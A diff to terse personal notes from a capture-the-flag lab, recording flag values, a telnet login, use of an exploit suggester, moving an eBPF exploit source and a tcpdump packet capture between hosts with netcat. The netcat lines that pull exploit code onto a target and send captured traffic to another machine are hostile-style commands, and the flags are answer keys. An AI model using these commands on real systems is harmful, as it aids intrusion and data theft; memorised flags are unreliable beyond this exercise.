@@ -171,6 +171,7 @@ telnet 10.0.2.147
 the right user was joey
 flag{f9038fd090b8490c7d8b613f0df054ba0e6ff63a82e19b}.jpg
 -------------------------------------------------------------------------
+flag{6be6ef}
 used linux exploit suggester
 find uname -a
 Linux matrix3-sea-turtle 4.13.0-21-generic #24-Ubuntu SMP Mon Dec 18 17:29:16 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
@@ -194,10 +195,18 @@ nc -lvnp 2424
  nc -w 5 192.168.0.2 2424 >eBPF.c
 flag{6be6ef286c041a489b9f681acdd8afebb441a9b22df584}.jpg
 ----------------------------------------------------------------------
+flag{14ce18}
+logged in as a root to cuiteuer
+https://www.tcpdump.org/manpages/tcpdump.1.html
+ tcpdump -w dump.pcap
 
+send the file to my server
+nc -lvnp 4242 < ./dump.pcap
 
-
-
+opend another terminal to recive the packet 
+nc -w 5 10.0.2.233 4242 >dump.pcap
+flag{14ce1808aaac88fcfe4baa5d180148b026890a96002103}
+--------------------------------------------------------------------------
 
 
 
